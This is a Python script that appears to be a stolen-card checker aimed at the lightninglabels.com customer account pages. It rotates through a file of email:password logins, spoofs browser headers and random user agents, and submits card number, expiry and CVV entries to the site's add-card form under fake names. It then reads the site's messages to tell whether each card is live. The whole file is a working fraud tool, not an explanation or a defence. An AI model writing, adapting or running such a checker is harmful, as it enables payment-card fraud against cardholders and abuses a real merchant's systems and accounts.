import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
import json
from user_agent import generate_user_agent
import re
from faker import Faker
from colorama import Fore, Back, Style, init
import random , time , os

fake = Faker()
init(autoreset=True)
with open("acc.txt", "r") as file:
		accounts = file.readlines()



index = 0


def get_next_account():
		global index, current_proxy
		if index < len(accounts):
				account = accounts[index].strip()
				index += 1
		else:
				index = 0 
				account = accounts[index].strip()
				index += 1

		email, password = account.split(":")
		return email, password



card_count = 0


email, password = get_next_account()



def Tele(ccx):
		global card_count
		global email, password

		card_count += 1

		if card_count > 10:
				card_count = 1  
				email, password = get_next_account() 



		ccx = ccx.strip().split('\n')[0]
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2]
		cvc = ccx.split("|")[3]

		if "20" in yy:
				yy = yy.split("20")[1]

		r = requests.session()


		user = generate_user_agent()

		if n.startswith('4'):
				card_type = 'VI'
		elif n.startswith('5'):
				card_type = 'MC'
		elif n.startswith('34') or n.startswith('37'):
				card_type = 'AM'

		headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'cache-control': 'max-age=0',
				'priority': 'u=0, i',
				'referer': 'https://www.lightninglabels.com/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
		}

		response = r.get('https://www.lightninglabels.com/customer/account/login/', headers=headers)

		soup = BeautifulSoup(response.content, 'html.parser')
		form_key = soup.find('input', attrs={'name':'form_key'})["value"]

		cookies = {'form_key': form_key}

		headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'cache-control': 'max-age=0',
				'content-type': 'application/x-www-form-urlencoded',
				'origin': 'https://www.lightninglabels.com',
				'priority': 'u=0, i',
				'referer': 'https://www.lightninglabels.com/customer/account/login/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
		}

		data = {
				'form_key': form_key,
				'login[username]': email,
				'login[password]': password,
				'send': 'Login',
		}

		response = r.post(
				'https://www.lightninglabels.com/customer/account/loginPost/',
				cookies=cookies,
				headers=headers,
				data=data,
		)

		headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'priority': 'u=0, i',
				'referer': 'https://www.lightninglabels.com/customer/account/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
		}

		response = r.get('https://www.lightninglabels.com/customer/payment/', headers=headers)
		matches = re.findall(
				r'<select name="billing_address_id" id="billing_address_id">.*?<option value="(\d+)">.*?</select>',
				response.text,
				re.DOTALL
		)
		matches_value = matches
		if matches_value:
				first_match = matches_value[0]
		else:
				return 'error'
		headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'cache-control': 'max-age=0',
				'content-type': 'application/x-www-form-urlencoded',
				'origin': 'https://www.lightninglabels.com',
				'priority': 'u=0, i',
				'referer': 'https://www.lightninglabels.com/customer/payment/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
		}

		data = {
				'form_key': form_key,
				'name_on_card': fake.last_name(),
				'card_type': card_type,
				'card_number': n,
				'expiration_month': mm,
				'expiration_year': f'20{yy}',
				'cvv': cvc,
				'billing_address_id': matches_value,
				'entity_id': '',
		}

		response = r.post('https://www.lightninglabels.com/customer/payment/addcard/', headers=headers, data=data)


		headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'cache-control': 'max-age=0',
				'priority': 'u=0, i',
				'referer': 'https://www.lightninglabels.com/customer/payment/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
		}

		response = r.get('https://www.lightninglabels.com/customer/payment/', headers=headers)
		mes = r.cookies.get_dict().get('mage-messages', '')
		text = unquote(mes)

		try:
			data = json.loads(text)
		except json.JSONDecodeError:
			return {"error": "Invalid JSON format"}  # إرجاع خطأ إذا كانت البيانات غير صالحة

	# استخراج الرسائل فقط
		results = []

		for item in data:
			# جلب النص فقط من البيانات
			text_value = item.get('text', 'No text found')
			results.append(text_value)

	# إرجاع الرسائل كقيمة مفردة (من غير تنسيقات أو هيكل إضافي)
		return "\n".join(results)
